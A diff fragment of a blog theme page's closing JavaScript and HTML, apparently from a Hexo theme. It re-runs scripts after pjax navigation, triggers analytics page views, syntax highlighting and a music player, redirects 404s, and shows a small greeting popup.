+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
